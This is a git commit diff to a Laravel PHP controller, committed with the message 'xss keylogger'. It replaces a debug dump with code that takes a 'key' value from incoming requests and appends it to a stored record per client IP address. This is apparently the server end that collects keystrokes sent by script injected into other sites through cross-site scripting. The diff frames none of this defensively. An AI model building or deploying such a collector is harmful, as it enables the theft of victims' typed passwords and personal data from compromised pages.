99e6dbcc58bf8dc4119a3717ec0211a43fe3c4ca
Duy Nguyen <duy210697@gmail.com>
2019-03-03 01:17:35 +0700

    2019-03-03: xss keylogger

--- app/Http/Controllers/XssController.php
+++ app/Http/Controllers/XssController.php
@@ -2,12 +2,23 @@
 
 namespace App\Http\Controllers;
 
+use App\KeyLogger;
 use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 
 class XssController extends Controller
 {
     function index(Request $request) {
-        return dd($request);
+        $keyLogger = KeyLogger::where('ip', $request->ip())->first();
+        if ($keyLogger != null) {
+            $keyLogger->content .= $request->only('key')['key'];
+            $keyLogger->save();
+        } else {
+            $keyLogger = KeyLogger::create([
+                'ip' => $request->ip(),
+                'content' => $request->only('key')['key']
+            ]);
+        }
+        return view('xss', compact('keyLogger'));
     }
 }
